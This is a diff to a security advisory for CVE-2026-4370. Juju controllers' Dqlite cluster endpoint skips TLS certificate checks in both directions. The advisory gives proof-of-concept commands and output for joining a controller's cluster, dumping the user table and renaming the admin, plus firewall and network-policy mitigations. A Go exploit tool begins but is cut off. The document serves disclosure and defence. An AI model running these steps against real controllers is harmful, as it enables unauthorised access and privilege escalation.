@@ -5,31 +5,31 @@ aliases:
   - CVE-2026-4370
 summary: "Juju has Improper TLS Client/Server authentication and certificate verification on\
   \ Database Cluster\n### Impact\nAny Juju controller since 3.2.0.\n\nAn attacker with only\
-  \ route-ability to the target juju controller Dqlite cluster endpoint may join the Dqlite\
-  \ cluster, read and modify all information, including escalating privileges, open firewall\
+  \ route-ability to the target juju controller Dqlite cluster endpoint\nmay join the Dqlite\
+  \ cluster, read and modify all information, including escalating privileges,\nopen firewall\
   \ ports etc.\n\nThis is due to not checking the client certificate, additionally, the client\
-  \ does not check the server's certificate (MITM attack possible), so anything goes.\n\nhttps://github.com/juju/juju/blob/001318f51ac456602aef20b123684f1eeeae9a77/internal/database/node.go#L312-L324\n\
+  \ does not\ncheck the server's certificate (MITM attack possible), so anything goes.\n\nhttps://github.com/juju/juju/blob/001318f51ac456602aef20b123684f1eeeae9a77/internal/database/node.go#L312-L324\n\
   \n#### PoC\nUsing the tool referenced below.\n\nBootstrap a controller and show the users:\n\
   ```\n$ juju bootstrap lxd a\nCreating Juju controller \"a\" on lxd/localhost\nLooking for\
   \ packaged Juju agent version 4.0.4 for amd64\n<...>\nLaunching controller instance(s) on\
   \ localhost/localhost...\n - juju-fefd2b-0 (arch=amd64)\nInstalling Juju agent on bootstrap\
   \ instance\nWaiting for address\nAttempting to connect to 10.151.236.15:22\n<...>\nContacting\
   \ Juju controller at 10.151.236.15 to verify accessibility...\n\nBootstrap complete, controller\
-  \ \"a\" is now available\nController machines are in the \"controller\" model\n\nNow it's\
-  \ possible to run\n\tjuju add-model <model-name>\nto create a new model to deploy workloads.\n\
-  $ juju users\nController: a\n\nName               Display name  Access     Date created  Last\
-  \ connection\nadmin*             admin         superuser  1 minute ago  just now\njuju-metrics\
-  \       Juju Metrics  login      1 minute ago  never connected\neveryone@external\n```\n\n\
-  Join the cluster with the first cluster member:\n```\n$ dqlite-demo --db 192.168.1.25:9999\
-  \ --join 10.151.236.15:17666\ndqlite interactive shell.\nEnter SQL statements terminated with\
-  \ a semicolon.\nMeta-commands: .switch <database>  .close  .exit\n\nConnected to database\
-  \ \"demo\".\ndemo>\n```\n\nJoin the cluster with another cluster member and give the admin\
-  \ a new name:\n```\ndqlite-demo --db 192.168.1.25:9998 --join 10.151.236.15:17666\ndqlite\
-  \ interactive shell.\nEnter SQL statements terminated with a semicolon.\nMeta-commands: .switch\
-  \ <database>  .close  .exit\n\nConnected to database \"demo\".\ndemo> .switch controller\n\
-  Connected to database \"controller\".\ncontroller> select * from user;\nuuid             \
-  \                    | name              | display_name | external | removed | created_by_uuid\
-  \                      | created_at\n-------------------------------------+-------------------+--------------+----------+---------+--------------------------------------+----------------------------------------\n\
+  \ \"a\" is now available\nController machines are in the \"controller\" model\n\nNow you can\
+  \ run\n\tjuju add-model <model-name>\nto create a new model to deploy workloads.\n$ juju users\n\
+  Controller: a\n\nName               Display name  Access     Date created  Last connection\n\
+  admin*             admin         superuser  1 minute ago  just now\njuju-metrics       Juju\
+  \ Metrics  login      1 minute ago  never connected\neveryone@external\n```\n\nJoin the cluster\
+  \ with the first cluster member:\n```\n$ dqlite-demo --db 192.168.1.25:9999 --join 10.151.236.15:17666\n\
+  dqlite interactive shell.\nEnter SQL statements terminated with a semicolon.\nMeta-commands:\
+  \ .switch <database>  .close  .exit\n\nConnected to database \"demo\".\ndemo>\n```\n\nJoin\
+  \ the cluster with another cluster member and give the admin a new name:\n```\ndqlite-demo\
+  \ --db 192.168.1.25:9998 --join 10.151.236.15:17666\ndqlite interactive shell.\nEnter SQL\
+  \ statements terminated with a semicolon.\nMeta-commands: .switch <database>  .close  .exit\n\
+  \nConnected to database \"demo\".\ndemo> .switch controller\nConnected to database \"controller\"\
+  .\ncontroller> select * from user;\nuuid                                 | name          \
+  \    | display_name | external | removed | created_by_uuid                      | created_at\n\
+  -------------------------------------+-------------------+--------------+----------+---------+--------------------------------------+----------------------------------------\n\
   9d5c7126-1401-4ce6-8603-6a6b5ac90d23 | admin             | admin        | false    | false\
   \   | 9d5c7126-1401-4ce6-8603-6a6b5ac90d23 | 2026-03-17 06:38:25.816694339 +0000 UTC\n4e1d65ae-564e-4c0e-8ef6-da8b7fb69b53\
   \ | juju-metrics      | Juju Metrics | false    | false   | 9d5c7126-1401-4ce6-8603-6a6b5ac90d23\
@@ -41,11 +41,39 @@ summary: "Juju has Improper TLS Client/Server authentication and certificate ver
   \  Access     Date created   Last connection\nadmin*             Silly Admin   superuser \
   \ 6 minutes ago  just now\njuju-metrics       Juju Metrics  login      6 minutes ago  never\
   \ connected\neveryone@external\n```\n\n### Patches\nJuju versions 3.6.20 and 4.0.5 are patched\
-  \ to fix this issue.\n\n### Workarounds\nEither:\na. Configure restrictive firewall rules\
-  \ and use a trusted network fabric for Juju controllers in HA. Port 17666 must only be connected\
-  \ to by other controller IP addresses.\nb. Disable HA by reducing to one Juju controller,\
-  \ block incoming connections to port 17666 and outgoing connections to any port 17666.\n\n\
-  ### Resources\nhttps://github.com/juju/juju/blob/001318f51ac456602aef20b123684f1eeeae9a77/internal/database/node.go#L312-L324\n\
+  \ to fix this issue.\n\n### Workarounds\nThe strongest protection is to apply the security\
+  \ updates. The following mitigations have also been explored. If security updates cannot be\
+  \ applied, you should only apply the following steps as a last resort and restore the original\
+  \ configuration file once updates are applied. Please note that modifying configuration files\
+  \ may stop future unattended upgrades from completing successfully, until these are reverted\
+  \ to the original content.\n\nOption 1: Disable the HA (High Availability) controller. If\
+  \ your environment does not strictly require HA, reducing the cluster to a single controller\
+  \ removes the need for DQlite replication. Moreover, the port that replicates the vulnerability\
+  \ should be blocked, namely 17666.\nOption 2: Restrict what IPs can communicate with port\
+  \ 17666, by implementing firewall rules to block all ingress traffic to this port. Only Juju\
+  \ controller IPs should be able to connect to this port.\n\nTo restrict access to the DQlite\
+  \ port to just the set of controller IPs, here's an example using ufw for a machine controller.\
+  \ This needs to be run on each controller. If the controller nodes change configuration, the\
+  \ rules will need to be updated accordingly.\nYou will need to enable access to the controller\
+  \ API port 17070 in accordance with your requirements for allowing clients to connect to the\
+  \ Juju controllers.\n\n```\n# Retrict access to the Dqlite port.\nsudo ufw allow from <controllerip1>\
+  \ to any port 17666 proto tcp\nsudo ufw allow from <controllerip2> to any port 17666 proto\
+  \ tcp\nsudo ufw allow from <controllerip3> to any port 17666 proto tcp\nsudo ufw deny 17666/tcp\n\
+  # Similarly, the mongo db port needs to allow controller access.\nsudo ufw allow from <controllerip1>\
+  \ to any port 37017 proto tcp\nsudo ufw allow from <controllerip2> to any port 37017 proto\
+  \ tcp\nsudo ufw allow from <controllerip3> to any port 37017 proto tcp\nsudo ufw deny 37017/tcp\n\
+  # Allow access to the controller API port.\nsudo ufw allow from <your cidr goes here> to any\
+  \ port 17070 proto tcp\n# Allow access to the controller SSH port.\nsudo ufw allow from <your\
+  \ cidr goes here> to any port 22 proto tcp\n# Ensure the firewall is enabled.\nsudo ufw enable\n\
+  # Check that the rules have been added correctly.\nsudo ufw status\n```\n\nFor Kubernetes\
+  \ controllers, HA is not supported. We recommend blocking access to port 17666. One way is\
+  \ to apply a network policy:\n\n```\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\n\
+  metadata:\n  name: controller-0-17666-only-itself\n  namespace: <your controller namespace\
+  \ goes here>\nspec:\n  podSelector:\n    matchLabels:\n      app.kubernetes.io/name: controller\n\
+  \      statefulset.kubernetes.io/pod-name: controller-0\n  policyTypes:\n    - Ingress\n \
+  \ ingress:\n    - from:\n        - podSelector:\n            matchLabels:\n              app.kubernetes.io/name:\
+  \ controller\n              statefulset.kubernetes.io/pod-name: controller-0\n      ports:\n\
+  \        - protocol: TCP\n          port: 17666\n```\n\n### References\nhttps://github.com/juju/juju/blob/001318f51ac456602aef20b123684f1eeeae9a77/internal/database/node.go#L312-L324\n\
   \n### PoC Tool\n\nBased on the go-dqlite demo app.\n\n```go\npackage main\n\nimport (\n\t\"\
   context\"\n\t\"crypto/ecdsa\"\n\t\"crypto/elliptic\"\n\t\"crypto/rand\"\n\t\"crypto/tls\"\n\
   \t\"crypto/x509\"\n\t\"crypto/x509/pkix\"\n\t\"database/sql\"\n\t\"encoding/pem\"\n\t\"fmt\"\
